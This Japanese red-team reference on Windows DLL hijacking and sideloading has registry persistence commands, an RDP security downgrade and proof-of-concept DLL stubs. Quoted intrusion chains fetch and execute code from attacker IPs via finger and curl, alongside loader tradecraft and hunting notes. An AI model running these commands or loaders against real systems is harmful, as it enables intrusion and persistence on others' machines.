Accessibility 設定によるトリガーと永続化
- ユーザーコンテキスト（HKCU）: `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM（HKLM）: `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator の起動時に配置した DLL が読み込まれます。セキュアデスクトップ（ログオン画面）で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL がセキュアデスクトップ上で SYSTEM として実行されます。

RDP をトリガーとする SYSTEM 実行（ラテラルムーブメント）
- 従来の RDP セキュリティレイヤーを許可します: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- ホストに RDP 接続し、ログオン画面で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL がセキュアデスクトップ上で SYSTEM として実行されます。
- RDP セッションを閉じると実行が停止するため、速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool（AT）のレジストリエントリ（例: CursorIndicator）を複製し、任意のバイナリ/DLL を指すように編集してインポートした後、`configuration` にその AT 名を設定できます。これにより、Accessibility フレームワークを介して任意の実行をプロキシできます。

注意事項
- `%windir%\System32` への書き込みと HKLM 値の変更には、管理者権限が必要です。
- すべての payload ロジックを `DLL_PROCESS_ATTACH` に実装できます。exports は不要です。

## ケーススタディ: CVE-2025-1729 - TPQMAssistant.exe を使用した権限昇格

このケースでは、Lenovo の TrackPoint Quick Menu（`TPQMAssistant.exe`）における **Phantom DLL Hijacking** を解説します。この脆弱性は **CVE-2025-1729** として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### 脆弱性の詳細

- **コンポーネント**: `C:\ProgramData\Lenovo\TPQM\Assistant\` にある `TPQMAssistant.exe`。
- **スケジュールされたタスク**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は、ログオン中のユーザーのコンテキストで毎日午前 9:30 に実行されます。
- **ディレクトリのアクセス許可**: `CREATOR OWNER` が書き込み可能で、ローカルユーザーが任意のファイルを配置できます。
- **DLL の検索動作**: 最初に作業ディレクトリから `hostfxr.dll` の読み込みを試み、見つからない場合は "NAME NOT FOUND" を記録します。これはローカルディレクトリが優先して検索されることを示しています。

### Exploit の実装

攻撃者は同じディレクトリに悪意のある `hostfxr.dll` stub を配置し、欠落している DLL を悪用してユーザーのコンテキストでコードを実行できます:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### 攻撃フロー

1. 標準ユーザーとして、`C:\ProgramData\Lenovo\TPQM\Assistant\` に `hostfxr.dll` を配置する。
2. 現在のユーザーのコンテキストで、スケジュールされたタスクが午前9時30分に実行されるのを待つ。
3. タスクの実行時に管理者がログインしている場合、悪意のある DLL は管理者のセッションで中整合性レベルで実行される。
4. 標準的な UAC bypass 手法を組み合わせ、中整合性レベルから SYSTEM 権限に昇格する。

## 事例研究: MSI CustomAction Dropper + 署名済みホスト経由の DLL side-loading（wsc_proxy.exe）

脅威アクターは、信頼された署名済みプロセスのもとで payload を実行するため、MSI ベースの dropper と DLL side-loading を組み合わせることがよくあります。<sup>[[10]](#references)</sup>

チェーンの概要
- ユーザーが MSI をダウンロードする。GUI インストール中に CustomAction（例: LaunchApplication または VBScript アクション）がサイレントに実行され、埋め込みリソースから次のステージを再構築する。
- dropper は正規の署名済み EXE と悪意のある DLL を同じディレクトリに書き込む（例: Avast 署名済みの wsc_proxy.exe と攻撃者が制御する wsc.dll のペア）。
- 署名済み EXE が起動すると、Windows の DLL 検索順序により、作業ディレクトリにある wsc.dll が最初に読み込まれ、署名済みプロセスの子として攻撃者のコードが実行される（ATT&CK T1574.001）。

MSI の分析（確認する点）
- CustomAction テーブル:
  - 実行ファイルまたは VBScript を実行するエントリを探す。疑わしいパターンの例: LaunchApplication が埋め込みファイルをバックグラウンドで実行する。
  - Orca（Microsoft Orca.exe）で、CustomAction、InstallExecuteSequence、Binary テーブルを調べる。
- MSI CAB 内の埋め込み／分割 payload:
  - 管理者として展開: msiexec /a package.msi /qb TARGETDIR=C:\out
  - または lessmsi を使用: lessmsi x package.msi C:\out
  - VBScript CustomAction によって連結・復号される複数の小さな断片を探す。一般的なフロー:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

Practical sideloading with wsc_proxy.exe
- 次の2つのファイルを同じフォルダーに配置します。
  - wsc_proxy.exe: 正規の署名済みホスト（Avast）。プロセスは、ディレクトリ内から名前を指定して wsc.dll を読み込もうとします。
  - wsc.dll: 攻撃者のDLL。特定のexportsが不要なら、DllMainだけで十分です。必要な場合はproxy DLLを作成し、payloadをDllMainで実行しながら、必要なexportsを本物のライブラリに転送します。
- 最小限のDLL payloadを作成します。

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- export要件を満たすには、proxying framework（例: DLLirant/Spartacus）を使って、payloadも実行するforwarding DLLを生成します。

- この手法は、host binaryによるDLL名解決に依存します。hostが絶対パスや安全なロードフラグ（例: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories）を使用している場合、hijackに失敗することがあります。
- KnownDLLs、SxS、forwarded exportsは優先順位に影響する可能性があるため、host binaryとexport setの選定時に考慮する必要があります。

## 署名済みtriad + 暗号化payload（ShadowPadのケーススタディ）

Check Pointは、Ink Dragonが正規ソフトウェアに紛れ込みつつ、コアpayloadをディスク上で暗号化したままにするため、ShadowPadの配備に**3ファイルのtriad**を使用すると説明しています:<sup>[[12]](#references)</sup>

1. **署名済みhost EXE** – AMD、Realtek、NVIDIAなどのベンダーが悪用されます（`vncutil64.exe`、`ApplicationLogs.exe`、`msedge_proxyLog.exe`）。攻撃者は実行ファイルをWindowsのバイナリに見える名前（例: `conhost.exe`）に変更しますが、Authenticode署名は有効なままです。
2. **悪意のあるloader DLL** – EXEと同じ場所に、想定される名前（`vncutil64loc.dll`、`atiadlxy.dll`、`msedge_proxyLogLOC.dll`）で配置されます。このDLLは通常、ScatterBrain frameworkで難読化されたMFCバイナリで、暗号化blobを探して復号し、ShadowPadをreflectiveにmapすることだけを目的とします。
3. **暗号化payload blob** – 多くの場合、同じディレクトリに`<name>.tmp`として保存されます。復号したpayloadをメモリにマッピングした後、loaderはTMPファイルを削除してforensic evidenceを消去します。

Tradecraftに関するメモ:

* PE header内の元の`OriginalFileName`を維持したまま署名済みEXEの名前を変更すると、ベンダー署名を保ったままWindowsバイナリを装えます。そのため、Ink Dragonのように、実際はAMD/NVIDIAのユーティリティである`conhost.exe`風のバイナリを配置する手法を再現できます。
* 実行ファイルは信頼された状態を保つため、多くのallowlisting controlsでは、悪意のあるDLLをその隣に置くだけで済みます。loader DLLのカスタマイズに注力してください。通常、署名済みの親ファイルには手を加えずに実行できます。
* ShadowPadのdecryptorは、TMP blobがloaderの隣にあり、マッピング後にファイルをゼロ化できるよう書き込み可能であることを想定しています。payloadがロードされるまでは、ディレクトリを書き込み可能な状態にしてください。メモリ上にロードされた後は、OPSECのためTMPファイルを安全に削除できます。

### LOLBAS stager + staged archive sideloading chain（Finger → tar/curl → WMI）

オペレーターはDLL sideloadingとLOLBASを組み合わせ、ディスク上に残すカスタムartifactを、信頼されたEXEの隣に置く悪意のあるDLLだけにします:<sup>[[1]](#references)</sup>

- **Remote command loader（Finger）:** Hidden PowerShellが`cmd.exe /c`を起動し、Finger serverからコマンドを取得して`cmd`にパイプします:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host` は TCP/79 のテキストを取得します。`| cmd` はサーバーの応答を実行するため、オペレーターはサーバー側で second stage を切り替えられます。

- **組み込みのダウンロード／展開:** 無害な拡張子のアーカイブをダウンロードして展開し、sideloader のターゲットと DLL をランダムな `%LocalAppData%` フォルダーに配置します。

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L` は進行状況を非表示にしてリダイレクトに従います。`tar -xf` は Windows 標準の tar を使用します。

- **WMI/CIM による起動:** WMI 経由で EXE を起動すると、隣に配置された DLL を読み込む際、テレメトリには CIM で作成されたプロセスとして記録されます。

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - ローカル DLL を優先するバイナリ（例: `intelbq.exe`、`nearby_share.exe`）で動作し、payload（例: Remcos）は信頼された名前で実行される。

- **Hunting:** `/p`、`/m`、`/c` が同時に指定された `forfiles` を検知する。管理者用スクリプト以外では珍しい。


## Case Study: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

最近の Lotus Blossom による侵入では、信頼された更新チェーンを悪用して NSIS でパックされた dropper を配信し、DLL sideload と完全にメモリ内で動作する payload を展開した。<sup>[[13]](#references)</sup>

Tradecraft の流れ
- `update.exe`（NSIS）が `%AppData%\Bluetooth` を作成して **HIDDEN** 属性を設定し、名前を変更した Bitdefender Submission Wizard の `BluetoothService.exe`、悪意のある `log.dll`、暗号化された blob `BluetoothService` を配置してから EXE を起動する。
- ホスト EXE は `log.dll` を import し、`LogInit`/`LogWrite` を呼び出す。`LogInit` は blob を mmap で読み込む。`LogWrite` は独自の LCG ベースのストリーム暗号（定数 **0x19660D** / **0x3C6EF35F**、過去の hash から導出した key material）で復号し、バッファを平文の shellcode で上書きして、一時データを解放後、そこへジャンプする。
- IAT を避けるため、loader は export 名を **FNV-1a basis 0x811C9DC5 + prime 0x1000193** で hash 化し、Murmur 風の avalanche（**0x85EBCA6B**）を適用して、salt 付きの target hash と照合する。

メイン shellcode（Chrysalis）
- 5 回のパスで、key `gQ2JR&9;` を使った add/XOR/sub を繰り返し、PE に似たメイン module を復号する。その後 `Kernel32.dll` → `GetProcAddress` を動的に読み込み、import 解決を完了する。
- 文字ごとの bit-rotate/XOR 変換で DLL 名の文字列を実行時に再構築し、`oleaut32`、`advapi32`、`shlwapi`、`user32`、`wininet`、`ole32`、`shell32` を読み込む。
- 2 つ目の resolver は **PEB → InMemoryOrderModuleList** をたどり、各 export table を 4 バイト単位で解析して Murmur 風の mixing を行う。hash が見つからない場合にのみ `GetProcAddress` にフォールバックする。

埋め込み設定と C2
- 設定は配置された `BluetoothService` ファイル内の **offset 0x30808**（size **0x980**）にあり、key `qwhvb^435h&*7` で RC4 復号すると、C2 URL と User-Agent が明らかになる。
- beacon はドット区切りの host profile を作成し、tag `4Q` を先頭に付けてから、key `vAuig34%^325hGV` で RC4 暗号化し、HTTPS 経由で `HttpSendRequestA` に渡す。応答は RC4 復号され、tag switch（`4T` shell、`4V` process exec、`4W/4X` file write、`4Y` read/exfil、`4\\` uninstall、`4` drive/file enum + chunked transfer cases）で処理される。
- 実行モードは CLI args で制御される。引数なし = `-i` を指定して service/Run key に永続化を設定し、`-i` は `-k` を付けて自身を再起動する。`-k` はインストールをスキップして payload を実行する。

確認された別の loader
- 同じ侵入では Tiny C Compiler も配置され、`C:\ProgramData\USOShared\` から `libtcc.dll` と同じディレクトリにある状態で `svchost.exe -nostdlib -run conf.c` を実行した。攻撃者が用意した C source には shellcode が埋め込まれており、PE をディスクに書き込むことなく、コンパイルしてメモリ内で実行した。次のように再現できる:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- この TCC ベースのコンパイル・実行段階では、実行時に `Wininet.dll` をインポートし、ハードコードされた URL から第2段階の shellcode を取得することで、コンパイラーの実行を装う柔軟な loader を実現していました。

## export proxying + host thread parking を使った署名済みホストの sideloading

一部の DLL sideloading チェーンでは、**安定性を高める工夫**を加え、悪意のある DLL のロード後にクラッシュするのではなく、後続の stage を問題なくロードできるだけの時間、正規のホストを稼働させます。<sup>[[11]](#references)</sup>

確認されているパターン
- 信頼できる EXE を、`version.dll` など依存関係で想定される名前の悪意のある DLL と同じディレクトリに配置する。
- 悪意のある DLL は、想定されるすべての export を実際のシステム DLL（例: `%SystemRoot%\\System32\\version.dll`）に **proxy** する。これにより、import の解決が成功し、ホストプロセスは動作を続けられる。
- ロード後、悪意のある DLL はホストの entry point にパッチを適用し、メインスレッドが終了したりプロセスを終了させるコードパスを実行したりせず、無限の `Sleep` ループに入るようにする。
- 新しいスレッドが実際の悪意ある処理を実行する。次の段階の DLL 名またはパス（RC4/XOR がよく使われる）を復号し、`LoadLibrary` で起動する。

重要な理由
- 通常の DLL proxying では API 互換性が保たれますが、後続の stage に必要な時間だけホストが稼働し続ける保証はありません。
- メインスレッドを `Sleep(INFINITE)` で停止させると、loader が worker thread で復号、stage 配置、またはネットワークの初期化を行う間、署名済みプロセスを稼働状態に保てます。
- 不審な `DllMain` だけを調査していると、ホストの entry point へのパッチ適用後に不審な動作が発生し、二次スレッドが起動するこのパターンを見逃す可能性があります。

最小限のワークフロー
1. 署名済みホスト EXE をコピーし、ローカルディレクトリから読み込まれる DLL を特定する。
2. 同じ関数を export し、正規の DLL に転送する proxy DLL を作成する。
3. `DllMain(DLL_PROCESS_ATTACH)` で worker thread を作成する。
4. そのスレッドから、ホストの entry point またはメインスレッドの開始ルーチンにパッチを適用し、`Sleep` ループに入るようにする。
5. 次の段階の DLL 名または設定を復号し、`LoadLibrary` を呼び出すか、payload を manual-map する。

防御上の着眼点
- `version.dll` や同様に一般的なライブラリを、`System32` ではなくアプリケーションディレクトリから読み込む署名済みプロセス。
- イメージのロード直後に発生するプロセス entry point へのメモリパッチ。特に、`Sleep`/`SleepEx` へリダイレクトする jump/call。
- proxy DLL によって作成され、復号された名前の別 DLL に対して直ちに `LoadLibrary` を呼び出すスレッド。
- `ProgramData`、`%TEMP%`、展開済みアーカイブのパスなど、書き込み可能な staging ディレクトリ内でベンダーの実行ファイルと並べて配置された、すべての export を備える proxy DLL。

## References

- [1] [Red Canary – Intelligence Insights: 2026年1月](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 - TPQMAssistant.exe を使用した権限昇格](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – Windows での DLL hijacking。シンプルな C の例。](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore がヨーロッパを標的とする新たなマルウェアを展開](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – デジタル・ドッペルゲンガー: Gh0st RAT を配布する進化するなりすましキャンペーンの分析](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – 利害の収束: 東南アジア政府を標的とする脅威クラスターの分析](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Ink Dragon の内部: ステルス性の高い攻撃作戦におけるリレーネットワークと内部構造を解明](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Chrysalis Backdoor: Lotus Blossom のツールキットを詳しく解説](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → DLL hijack チェーン](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – イランの APT Screening Serpens による2026年の諜報キャンペーンを追跡](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – `<appDomainManagerAssembly>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – `<appDomainManagerType>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – `<probing>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – `<bypassTrustedAppStrongNames>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – `<publisherPolicy>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – `<requiredRuntime>` 要素](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Fast and Furious: イラン紛争中の Nimbus Manticore の作戦](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Task Actions](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 が東南アジアの政府機関と重要インフラを標的に](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
